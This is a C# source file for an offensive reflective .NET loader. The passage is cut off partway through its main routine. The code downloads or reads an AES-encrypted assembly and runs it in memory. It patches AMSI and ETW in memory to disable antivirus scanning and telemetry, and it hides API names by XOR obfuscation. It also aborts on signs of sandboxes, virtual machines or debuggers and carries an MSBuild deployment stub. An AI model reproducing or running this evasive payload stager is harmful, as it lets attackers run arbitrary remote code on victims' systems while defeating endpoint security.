using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Linq;
using System.Threading;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Net.NetworkInformation;

/*
 * NetLoader - reflective assembly loader
 *
 * Changes vs the original XOR version:
 *   - Payload encryption: AES-256-CBC with PBKDF2-HMAC-SHA256 key derivation
 *     (120,000 iterations, random 16-byte salt + random 16-byte IV per payload).
 *     On-disk format: "AES1" magic (4) || salt (16) || IV (16) || ciphertext.
 *   - New CLI: -aes <passphrase> replaces -xor <key>.
 *   - -enc mode encrypts a file into the same format so payloads can be staged.
 *   - Evasion hardening:
 *       * Sensitive API/dll names are stored XOR-obfuscated and rebuilt at runtime
 *         (no "amsi.dll"/"AmsiScanBuffer"/"EtwEventWrite" strings in the binary).
 *       * ETW neutralization now covers EtwEventWrite AND EtwEventWriteEx.
 *       * AMSI/ETW patch pages are restored to their original protection after write.
 *       * Optional -sleep <seconds> with +/-25% jitter before execution.
 *       * Optional -sandbox heuristic checks (CPU/RAM/uptime/MAC vendor/username).
 *       * Optional -anti-debug (DebugSessionCheck + RemoteDebugCheck).
 *       * Decrypted payload buffer is zeroed after Assembly.Load.
 *       * Opaque-predicate junk code and NoInlining on hot paths.
 *       * -quiet suppresses banner output; randomized browser UA on downloads.
 *
 * Compile (Windows, .NET Framework 4.7.2+):
 *   csc /optimize+ /platform:anycpu /out:NetLoader.exe NetLoader_AES.cs
 * Compile (Mono):
 *   mcs -optimize+ -out:NetLoader.exe NetLoader_AES.cs
 *
 * Usage:
 *   NetLoader -aes <passphrase> -path C:\payload.exe.aes
 *   NetLoader -b64 -aes <b64 passphrase> -path <b64 url> -args <b64 args...>
 *   NetLoader -enc -aes <passphrase> -path C:\payload.exe        (produces payload.exe.aes)
 *   NetLoader -aes <passphrase> -path http://host/payload.aes -sleep 30 -sandbox -anti-debug -quiet
 */

/* Uncomment this when deploying from MSBuild payload
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

   //This is for MSBuild later
  public class ClassExample : Task, ITask
  {
      public override bool Execute()
      {
          NetLoader.Main(new string[] { });
          return true;
      }
  }
*/

public class NetLoader
{

    // ---- XOR-obfuscated sensitive strings (rebuilt at runtime) ----
    private const string OB_A_M_S_I = "IC8wLWsiKy0=";
    private const string OB_A_M_S_I_S_C_A_N_B_U_F_F_E_R = "AC8wLRYlJi8ANiIjIzU=";
    private const string OB_N_T_D_L_L = "LzYnKCloIy0u";
    private const string OB_E_T_W_E_V_E_N_T_W_R_I_T_E = "BDY0ATMjKTUVMS0xIw==";
    private const string OB_E_T_W_E_V_E_N_T_W_R_I_T_E_E_X = "BDY0ATMjKTUVMS0xIwI5";
    private const string OB_K_E_R_N_E_L_3_2 = "KicxKiAqdHNsJygp";
    private const string OB_G_E_T_P_R_O_C_A_D_D_R_E_S_S = "Bic3FDcpJAAmJzYgNTQ=";
    private const string OB_L_O_A_D_L_I_B_R_A_R_Y_A = "DS0iIAkvJTMjMT0E";
    private const string OB_V_I_R_T_U_A_L_P_R_O_T_E_C_T = "FysxMDAnKxEwLDAgJTM=";
    private const string OB_I_S_D_E_B_U_G_G_E_R_P_R_E_S_E_N_T = "CDEHISczICYnMRQ3IzQkLDc=";
    private const string OB_C_H_E_C_K_R_E_M_O_T_E_D_E_B_U_G_G_E_R_P_R_E_S_E_N_T = "AiomJy4UIiwtNyEBIyU0JSQhNxY1JDEmKjE=";
    private const string OB_G_E_T_C_U_R_R_E_N_T_P_R_O_C_E_S_S = "Bic3BzA0NSQsNxQ3KSQkMTA=";
    private const string OB_G_L_O_B_A_L_M_E_M_O_R_Y_S_T_A_T_U_S_E_X = "Bi4sJiQqCiQvLDY8FTMgNjY3AD4=";
    private const string OB_G_E_T_T_I_C_K_C_O_U_N_T_6_4 = "Bic3ECwlLAItNioxcHM=";

    // ---- AES-256 constants ----
    private const int AES_ITERATIONS = 120000;
    private const int AES_SALT_SIZE = 16;
    private const int AES_IV_SIZE = 16;
    private const int AES_KEY_SIZE = 32;
    private static readonly byte[] AES_MAGIC = Encoding.ASCII.GetBytes("AES1");

    private static bool quiet = false;
    private static object[] globalArgs = null;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string Deobfuscate(string obfuscated)
    {
        byte[] data = Convert.FromBase64String(obfuscated);
        for (int i = 0; i < data.Length; i++)
            data[i] = (byte)(data[i] ^ (0x41 + (i % 7)));
        return Encoding.UTF8.GetString(data);
    }

    private static void Log(string message, bool force = false)
    {
        if (force || !quiet)
            Console.WriteLine(message);
    }

    public static IntPtr GetLoadedModuleAddress(string DLLName)
    {
        ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
        foreach (ProcessModule Mod in ProcModules)
        {
            if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
            {
                return Mod.BaseAddress;
            }
        }
        return IntPtr.Zero;
    }

    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
    {
        IntPtr FunctionPtr = IntPtr.Zero;
        try
        {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b)
            {
                pExport = OptHeader + 0x60;
            }
            else
            {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++)
            {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch
        {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        if (FunctionPtr == IntPtr.Zero)
        {
            // Export not found
            throw new MissingMethodException(ExportName + ", export not found.");
        }
        return FunctionPtr;
    }

    public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
    {
        IntPtr hModule = GetLoadedModuleAddress(DLLName);
        if (hModule == IntPtr.Zero)
        {
            throw new DllNotFoundException(DLLName + ", Dll was not found.");
        }

        return GetExportAddress(hModule, FunctionName);
    }

    public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
    {
        IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
        return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
    }

    public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
    {
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
        return funcDelegate.DynamicInvoke(Parameters);
    }

    // ---- Delegates (resolved at runtime, no static imports) ----
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr ApiResolver(IntPtr UrethralgiaOrc, string HypostomousBuried);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool MemoryPageGuard(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscribed, out uint ZygosisCoordination);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr ModuleLoader(string LiodermiaGranulater);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate bool DebugSessionCheck();

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate bool RemoteDebugCheck(IntPtr hProcess, ref bool pbDebuggerPresent);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr CurrentProcessGetter();

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate bool MemoryStatusQuery(ref MEMORYSTATUSEX lpBuffer);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate ulong UptimeQuery();

    [StructLayout(LayoutKind.Sequential)]
    private struct MEMORYSTATUSEX
    {
        public uint dwLength;
        public uint dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
    }

    // ---- PBKDF2-HMAC-SHA256 (portable, no framework overload dependency) ----
    private static byte[] Pbkdf2Sha256(byte[] password, byte[] salt, int iterations, int keyLength)
    {
        using (HMACSHA256 hmac = new HMACSHA256(password))
        {
            byte[] output = new byte[keyLength];
            int hashSize = hmac.HashSize / 8;
            int blocks = (keyLength + hashSize - 1) / hashSize;
            byte[] u = new byte[salt.Length + 4];
            Buffer.BlockCopy(salt, 0, u, 0, salt.Length);
            int offset = 0;

            for (int i = 1; i <= blocks; i++)
            {
                // INT_32_BE(i)
                u[u.Length - 4] = (byte)((i >> 24) & 0xFF);
                u[u.Length - 3] = (byte)((i >> 16) & 0xFF);
                u[u.Length - 2] = (byte)((i >> 8) & 0xFF);
                u[u.Length - 1] = (byte)(i & 0xFF);

                byte[] t = hmac.ComputeHash(u);
                byte[] block = (byte[])t.Clone();
                for (int j = 1; j < iterations; j++)
                {
                    t = hmac.ComputeHash(t);
                    for (int k = 0; k < block.Length; k++)
                        block[k] ^= t[k];
                }

                int copyLen = Math.Min(hashSize, keyLength - offset);
                Buffer.BlockCopy(block, 0, output, offset, copyLen);
                offset += copyLen;
            }
            return output;
        }
    }

    // ---- AES-256-CBC decrypt (magic || salt || iv || ciphertext) ----
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static byte[] AesDecrypt(byte[] blob, string passphrase)
    {
        if (blob == null || blob.Length < 4 + AES_SALT_SIZE + AES_IV_SIZE + 16)
            throw new ArgumentException("Payload blob is too small or malformed.");

        for (int i = 0; i < AES_MAGIC.Length; i++)
            if (blob[i] != AES_MAGIC[i])
                throw new ArgumentException("Not an AES-256 encrypted payload (bad magic).");

        byte[] salt = new byte[AES_SALT_SIZE];
        byte[] iv = new byte[AES_IV_SIZE];
        Buffer.BlockCopy(blob, 4, salt, 0, AES_SALT_SIZE);
        Buffer.BlockCopy(blob, 4 + AES_SALT_SIZE, iv, 0, AES_IV_SIZE);

        byte[] cipher = new byte[blob.Length - 4 - AES_SALT_SIZE - AES_IV_SIZE];
        Buffer.BlockCopy(blob, 4 + AES_SALT_SIZE + AES_IV_SIZE, cipher, 0, cipher.Length);

        byte[] key = Pbkdf2Sha256(Encoding.UTF8.GetBytes(passphrase), salt, AES_ITERATIONS, AES_KEY_SIZE);
        try
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (ICryptoTransform dec = aes.CreateDecryptor())
                using (MemoryStream ms = new MemoryStream(cipher))
                using (CryptoStream cs = new CryptoStream(ms, dec, CryptoStreamMode.Read))
                using (MemoryStream outMs = new MemoryStream())
                {
                    cs.CopyTo(outMs);
                    return outMs.ToArray();
                }
            }
        }
        finally
        {
            Array.Clear(key, 0, key.Length);
        }
    }

    // ---- AES-256-CBC encrypt (produces magic || salt || iv || ciphertext) ----
    private static byte[] AesEncrypt(byte[] plaintext, string passphrase)
    {
        byte[] salt = new byte[AES_SALT_SIZE];
        byte[] iv = new byte[AES_IV_SIZE];
        using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(salt);
            rng.GetBytes(iv);
        }

        byte[] key = Pbkdf2Sha256(Encoding.UTF8.GetBytes(passphrase), salt, AES_ITERATIONS, AES_KEY_SIZE);
        try
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (ICryptoTransform enc = aes.CreateEncryptor())
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, enc, CryptoStreamMode.Write))
                    {
                        cs.Write(plaintext, 0, plaintext.Length);
                        cs.FlushFinalBlock();
                    }

                    byte[] cipher = ms.ToArray();
                    byte[] output = new byte[4 + AES_SALT_SIZE + AES_IV_SIZE + cipher.Length];
                    Buffer.BlockCopy(AES_MAGIC, 0, output, 0, 4);
                    Buffer.BlockCopy(salt, 0, output, 4, AES_SALT_SIZE);
                    Buffer.BlockCopy(iv, 0, output, 4 + AES_SALT_SIZE, AES_IV_SIZE);
                    Buffer.BlockCopy(cipher, 0, output, 4 + AES_SALT_SIZE + AES_IV_SIZE, cipher.Length);
                    return output;
                }
            }
        }
        finally
        {
            Array.Clear(key, 0, key.Length);
        }
    }

    // ---- Anti-debug ----
    private static bool CheckDebugger()
    {
        string k32 = Deobfuscate(OB_K_E_R_N_E_L_3_2);
        try
        {
            IntPtr pIsDbg = GetLibraryAddress(k32, Deobfuscate(OB_I_S_D_E_B_U_G_G_E_R_P_R_E_S_E_N_T));
            DebugSessionCheck fIsDbg = (DebugSessionCheck)Marshal.GetDelegateForFunctionPointer(pIsDbg, typeof(DebugSessionCheck));
            if (fIsDbg())
                return true;

            IntPtr pCheck = GetLibraryAddress(k32, Deobfuscate(OB_C_H_E_C_K_R_E_M_O_T_E_D_E_B_U_G_G_E_R_P_R_E_S_E_N_T));
            RemoteDebugCheck fCheck = (RemoteDebugCheck)Marshal.GetDelegateForFunctionPointer(pCheck, typeof(RemoteDebugCheck));

            IntPtr pSelf = GetLibraryAddress(k32, Deobfuscate(OB_G_E_T_C_U_R_R_E_N_T_P_R_O_C_E_S_S));
            CurrentProcessGetter fSelf = (CurrentProcessGetter)Marshal.GetDelegateForFunctionPointer(pSelf, typeof(CurrentProcessGetter));

            bool remoteDebug = false;
            if (fCheck(fSelf(), ref remoteDebug) && remoteDebug)
                return true;
        }
        catch { }
        return false;
    }

    // ---- Sandbox / analysis environment heuristics ----
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool CheckSandbox()
    {
        // Less than 2 logical CPUs
        if (Environment.ProcessorCount < 2)
            return true;

        // Total physical RAM < 4 GB
        try
        {
            string k32 = Deobfuscate(OB_K_E_R_N_E_L_3_2);
            IntPtr pMem = GetLibraryAddress(k32, Deobfuscate(OB_G_L_O_B_A_L_M_E_M_O_R_Y_S_T_A_T_U_S_E_X));
            MemoryStatusQuery fMem = (MemoryStatusQuery)Marshal.GetDelegateForFunctionPointer(pMem, typeof(MemoryStatusQuery));
            MEMORYSTATUSEX msex = new MEMORYSTATUSEX();
            msex.dwLength = (uint)Marshal.SizeOf(typeof(MEMORYSTATUSEX));
            if (fMem(ref msex) && msex.ullTotalPhys < 4294967296UL)
                return true;
        }
        catch { }

        // Freshly booted (< 10 minutes uptime)
        try
        {
            string k32 = Deobfuscate(OB_K_E_R_N_E_L_3_2);
            IntPtr pTick = GetLibraryAddress(k32, Deobfuscate(OB_G_E_T_T_I_C_K_C_O_U_N_T_6_4));
            UptimeQuery fTick = (UptimeQuery)Marshal.GetDelegateForFunctionPointer(pTick, typeof(UptimeQuery));
            if (fTick() < 600000UL)
                return true;
        }
        catch { }

        // Known hypervisor MAC OUI prefixes
        string[] suspiciousOui = {
            "00:0C:29", "00:50:56", "00:05:69", "00:1C:14",  // VMware
            "00:1C:42",                                     // Parallels
            "00:15:5D",                                     // Hyper-V
            "08:00:27",                                     // VirtualBox
            "52:54:00",                                     // QEMU/KVM
            "00:16:3E"                                      // Xen
        };
        try
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus != OperationalStatus.Up)
                    continue;
                byte[] macBytes = ni.GetPhysicalAddress().GetAddressBytes();
                if (macBytes == null || macBytes.Length < 3)
                    continue;
                string mac = BitConverter.ToString(macBytes).Replace("-", ":");
                foreach (string oui in suspiciousOui)
                    if (mac.StartsWith(oui))
                        return true;
            }
        }
        catch { }

        // Analysis-oriented usernames
        string[] badNames = {
            "admin", "administrator", "test", "sandbox", "malware",
            "sample", "virus", "analysis", "wdagutilityaccount", "john", "mike"
        };
        string user = (Environment.UserName ?? "").ToLowerInvariant();
        foreach (string b in badNames)
            if (user.Contains(b))
                return true;

        return false;
    }

    // ---- Sleep with +-25% jitter (evades time-based sandbox detections) ----
    private static void SleepJitter(int seconds)
    {
        if (seconds <= 0)
            return;
        Random r = new Random();
        int ms = seconds * 1000;
        ms += (int)(ms * ((r.NextDouble() * 0.5) - 0.25));
        if (ms < 0)
            ms = 0;
        Thread.Sleep(ms);
    }

    // ---- Opaque predicate junk (cheap control-flow noise) ----
    private static void OpaqueJunk()
    {
        Random r = new Random();
        long a = r.Next(1, 4096);
        long b = r.Next(1, 4096);
        if ((a * a) == (b * b) + 1)
            Console.WriteLine("0x{0:X8}", (a ^ b));
    }

    private static IntPtr ResolveScanHook()
    {
        string k32 = Deobfuscate(OB_K_E_R_N_E_L_3_2);
        //ApiResolver
        IntPtr pApiResolver = GetLibraryAddress(k32, Deobfuscate(OB_G_E_T_P_R_O_C_A_D_D_R_E_S_S));
        IntPtr pModuleLoader = GetLibraryAddress(k32, Deobfuscate(OB_L_O_A_D_L_I_B_R_A_R_Y_A));

        ApiResolver fApiResolver = (ApiResolver)Marshal.GetDelegateForFunctionPointer(pApiResolver, typeof(ApiResolver));
        ModuleLoader fModuleLoader = (ModuleLoader)Marshal.GetDelegateForFunctionPointer(pModuleLoader, typeof(ModuleLoader));

        return fApiResolver(fModuleLoader(Deobfuscate(OB_A_M_S_I)), Deobfuscate(OB_A_M_S_I_S_C_A_N_B_U_F_F_E_R));
    }

    private static bool is64Bit()
    {
        if (IntPtr.Size == 4)
            return false;

        return true;
    }

    private static byte[] GetTelemetryBypassBytes()
    {
        if (!is64Bit())
            return Convert.FromBase64String("whQA");   // ret 0x14 (x86)
        return Convert.FromBase64String("ww==");        // ret (x64)
    }

    private static byte[] GetScanBypassBytes()
    {
        if (!is64Bit())
            return Convert.FromBase64String("uFcAB4DCGAA="); // mov eax,0x80070057; ret 0x18 (x86)
        return Convert.FromBase64String("uFcAB4DD");         // mov eax,0x80070057; ret (x64)
    }

    // Write a patch into a module export and restore the original page protection
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool OverwriteExport(string module, string export, byte[] patch, MemoryPageGuard pageGuard)
    {
        IntPtr pTarget = IntPtr.Zero;
        try { pTarget = GetLibraryAddress(module, export); } catch { return false; }

        uint oldProtect;
        if (pageGuard(pTarget, (UIntPtr)patch.Length, 0x40, out oldProtect))
        {
            Marshal.Copy(patch, 0, pTarget, patch.Length);
            uint tmp;
            pageGuard(pTarget, (UIntPtr)patch.Length, oldProtect, out tmp); // restore RX
            return true;
        }
        return false;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void NeutralizeTelemetry()
    {
        string ntdll = Deobfuscate(OB_N_T_D_L_L);
        string k32 = Deobfuscate(OB_K_E_R_N_E_L_3_2);

        IntPtr pMemoryPageGuard = GetLibraryAddress(k32, Deobfuscate(OB_V_I_R_T_U_A_L_P_R_O_T_E_C_T));
        MemoryPageGuard fMemoryPageGuard = (MemoryPageGuard)Marshal.GetDelegateForFunctionPointer(pMemoryPageGuard, typeof(MemoryPageGuard));

        byte[] patch = GetTelemetryBypassBytes();
        bool ok = OverwriteExport(ntdll, Deobfuscate(OB_E_T_W_E_V_E_N_T_W_R_I_T_E), patch, fMemoryPageGuard);
        ok = OverwriteExport(ntdll, Deobfuscate(OB_E_T_W_E_V_E_N_T_W_R_I_T_E_E_X), patch, fMemoryPageGuard) || ok;

        if (ok)
            Log("[+] ETW instrumentation neutralized");
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void HardenRuntime()
    {
        string k32 = Deobfuscate(OB_K_E_R_N_E_L_3_2);

        IntPtr pMemoryPageGuard = GetLibraryAddress(k32, Deobfuscate(OB_V_I_R_T_U_A_L_P_R_O_T_E_C_T));
        MemoryPageGuard fMemoryPageGuard = (MemoryPageGuard)Marshal.GetDelegateForFunctionPointer(pMemoryPageGuard, typeof(MemoryPageGuard));

        IntPtr amsiLibPtr = ResolveScanHook();
        byte[] patch = GetScanBypassBytes();

        uint oldProtect;
        if (fMemoryPageGuard(amsiLibPtr, (UIntPtr)patch.Length, 0x40, out oldProtect))
        {
            Marshal.Copy(patch, 0, amsiLibPtr, patch.Length);
            uint tmp;
            fMemoryPageGuard(amsiLibPtr, (UIntPtr)patch.Length, oldProtect, out tmp); // restore protection
            Log("[+] AMSI scan disabled");
        }
        else
        {
            Log("[!] Patching AMSI FAILED", true);
        }
    }

    private static string parseStringConsoleInput(string inputData, bool base64Decode)
    {
        if (base64Decode)
            inputData = Encoding.UTF8.GetString(Convert.FromBase64String(inputData));

        if (inputData.Trim().ToLower().Equals("x"))
            Environment.Exit(0);

        return inputData;

    }

    private static bool parseBoolConsoleInput(ConsoleKey consoleKey)
    {
        if (consoleKey == ConsoleKey.X)
            Environment.Exit(0);

        return (consoleKey == ConsoleKey.Y);
    }

    private static void printHelp()
    {
        Console.WriteLine("Usage: ");
        Console.WriteLine("  NetLoader [-b64] [-aes <passphrase>] -path <binary_path|url> [-args <binary_args>] [options]");
        Console.WriteLine("  NetLoader -enc -aes <passphrase> -path <input_file>");
        Console.WriteLine("");
        Console.WriteLine("\t-b64:        Optional flag indicating that all other parameters are base64 encoded.");
        Console.WriteLine("\t-aes:        Optional parameter indicating the payload is AES-256-CBC encrypted (PBKDF2-HMAC-SHA256, 120k iterations). Must be followed by the passphrase.");
        Console.WriteLine("\t-path:       Mandatory parameter. Indicates the path, either local or a URL, of the binary to load.");
        Console.WriteLine("\t-args:       Optional parameter used to pass arguments to the loaded binary. Must be followed by all arguments for the binary (last).");
        Console.WriteLine("\t-enc:        Encrypt <input_file> to <input_file>.aes using the AES-256 format (needs -aes and -path).");
        Console.WriteLine("\t-sleep <s>:  Sleep with +/-25% jitter before payload execution.");
        Console.WriteLine("\t-sandbox:    Abort if VM/analysis-environment indicators are detected.");
        Console.WriteLine("\t-anti-debug: Abort if a debugger is attached.");
        Console.WriteLine("\t-quiet:      Suppress informational output.");
        Console.WriteLine("");
        Console.WriteLine("Examples:");
        Console.WriteLine("  NetLoader -enc -aes s3cr3t -path payload.exe");
        Console.WriteLine("  NetLoader -aes s3cr3t -path payload.exe.aes -sleep 30 -sandbox -anti-debug -quiet");
    }

    private static Assembly loadASM(byte[] byteArray)
    {
        return Assembly.Load(byteArray);
    }

    private static byte[] readLocalFilePath(string filePath, FileMode fileMode)
    {
        byte[] buffer = null;
        using (FileStream fs = new FileStream(filePath, fileMode, FileAccess.Read))
        {
            buffer = new byte[fs.Length];
            fs.Read(buffer, 0, (int)fs.Length);
        }
        return buffer;

    }

    private static Type junkFunction(MethodInfo methodInfo)
    {
        return methodInfo.ReflectedType;
    }

    private static object invokeCSharpMethod(MethodInfo methodInfo)
    {
        object result = null;
        if (junkFunction(methodInfo) == methodInfo.ReflectedType)
        {
            try
            {
                result = methodInfo.Invoke(null, globalArgs);
            }
            catch (Exception ex)
            {
                Log("[!] Payload execution error: " + ex.Message, true);
            }
        }

        if (globalArgs != null && globalArgs.Length > 0 && globalArgs[0] != null)
            return globalArgs[0];
        return result;
    }

    private static string GetUserAgent()
    {
        string[] agents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
        };
        return agents[new Random().Next(agents.Length)];
    }

    private static byte[] downloadURL(string url)
    {
        HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(url);
        myRequest.Method = "GET";
        myRequest.UserAgent = GetUserAgent();
        myRequest.Timeout = 30000;
        myRequest.ReadWriteTimeout = 30000;
        using (WebResponse myResponse = myRequest.GetResponse())
        using (MemoryStream ms = new MemoryStream())
        {
            myResponse.GetResponseStream().CopyTo(ms);
            return ms.ToArray();
        }
    }

    public static int setProtocolTLS(int secProt)
    {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)secProt;
        return secProt;
    }

    private static MethodInfo getEntryPoint(Assembly asm)
    {
        return asm.EntryPoint;
    }

    private static void TriggerPayload(string payloadPathOrURL, string[] inputArgs, bool aesEncoded, string aesKey, int setProtType = 0)
    {
        setProtocolTLS(setProtType);

        Log("[+] URL/PATH : " + payloadPathOrURL + (inputArgs.Length > 0 ? " Arguments : " + string.Join(" ", inputArgs) : ""));
        globalArgs = new object[] { inputArgs };

        if (aesEncoded && payloadPathOrURL.ToLower().StartsWith("http"))
        {
            aesDeploy(downloadURL(payloadPathOrURL), aesKey);
        }
        else if (!aesEncoded && payloadPathOrURL.ToLower().StartsWith("http"))
        {
            plainDeploy(downloadURL(payloadPathOrURL));
        }
        else if (!aesEncoded && !payloadPathOrURL.ToLower().StartsWith("http"))
            plainDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open));
        else
            aesDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open), aesKey);
    }

    private static void aesDeploy(byte[] data, string passphrase)
    {
        byte[] plain = AesDecrypt(data, passphrase);
        try
        {
            invokeCSharpMethod(getEntryPoint(loadASM(plain)));
        }
        finally
        {
            // Zero the decrypted buffer once the CLR has copied the assembly
            Array.Clear(plain, 0, plain.Length);
        }
    }

    private static void plainDeploy(byte[] data)
    {
        invokeCSharpMethod(getEntryPoint(loadASM(data)));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Main(string[] args)
    {
        string payloadPathOrUrl = "";
        string[] payloadArgs = new string[] { };
        bool base64Enc = false;
        bool aesEnc = false;
        string aesKey = "";
        bool encMode = false;
        int sleepSeconds = 0;
        bool checkSandbox = false;
        bool checkDebug = false;

        if (args.Length == 0)
        {
            printHelp();
            return;
        }

        foreach (string argument in args)
        {
            if (argument.ToLower() == "--b64" || argument.ToLower() == "-b64")
            {
                base64Enc = true;
                Log("[+] Arguments are Base64 encoded, decoding them on the fly");
            }

            if (argument.ToLower() == "-aes" || argument.ToLower() == "--aes")
            {
                aesEnc = true;
                int argData = Array.IndexOf(args, argument) + 1;
                if (argData < args.Length)
                {
                    string rawArg = args[argData];
                    if (base64Enc)
                        aesKey = Encoding.UTF8.GetString(Convert.FromBase64String(rawArg));
                    else
                        aesKey = rawArg;
                }
                if (string.IsNullOrEmpty(aesKey))
                {
                    Console.WriteLine("[!] -aes requires a passphrase");
                    Environment.Exit(1);
                }
            }

            if (argument.ToLower() == "-path" || argument.ToLower() == "--path")
            {
                int argData = Array.IndexOf(args, argument) + 1;
                if (argData < args.Length)
                {
                    string rawPayload = args[argData];
                    if (base64Enc)
                        payloadPathOrUrl = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayload));
                    else
                        payloadPathOrUrl = rawPayload;
                }
            }

            if (argument.ToLower() == "-args" || argument.ToLower() == "--args")
            {
                int binaryArgsIndex = Array.IndexOf(args, argument) + 1;
                int nbBinaryArgs = args.Length - binaryArgsIndex;

                payloadArgs = new String[nbBinaryArgs];

                for (int i = 0; i < nbBinaryArgs; i++)
                {
                    string rawPayloadArgs = args[binaryArgsIndex + i];

                    if (base64Enc)
                        payloadArgs[i] = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayloadArgs));
                    else
                        payloadArgs[i] = rawPayloadArgs;
                }
            }

            if (argument.ToLower() == "-enc" || argument.ToLower() == "--enc")
            {
                encMode = true;
            }

            if (argument.ToLower() == "-sleep" || argument.ToLower() == "--sleep")
            {
                int argData = Array.IndexOf(args, argument) + 1;
                int s;
                if (argData < args.Length && int.TryParse(args[argData], out s))
                    sleepSeconds = s;
            }

            if (argument.ToLower() == "-sandbox")
                checkSandbox = true;

            if (argument.ToLower() == "-anti-debug")
                checkDebug = true;

            if (argument.ToLower() == "-quiet")
                quiet = true;
        }

        // Encrypt mode: produce a stager-ready AES-256 payload and exit
        if (encMode)
        {
            if (!aesEnc || string.IsNullOrEmpty(payloadPathOrUrl))
            {
                Console.WriteLine("[!] -enc requires: -enc -aes <passphrase> -path <input_file>");
                Environment.Exit(1);
            }
